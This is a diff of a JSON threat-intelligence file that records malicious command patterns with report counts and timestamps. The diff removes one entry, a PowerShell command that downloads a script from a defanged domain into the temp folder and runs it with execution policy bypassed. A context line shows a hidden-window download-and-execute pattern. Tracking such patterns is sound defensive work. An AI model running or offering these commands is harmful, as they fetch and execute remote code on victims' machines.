@@ -996,19 +996,6 @@
     ]
   },
   {
-    "Pattern": "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f '<URL>';powershell -ep bypass -File $f\"",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-17T22:21:10.789000+00:00",
-    "LastSeen": "2026-11-17T22:21:10.789000+00:00",
-    "ReportIds": [
-      "cmwl9b54l1i4f0omls40cjhgn"
-    ],
-    "PayloadExamples": [
-      "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'https://pillingthat[.]com/WfodrrIBwI';powershell -ep bypass -File $f\""
-    ]
-  },
-  {
     "Pattern": "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('<URL>'))\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
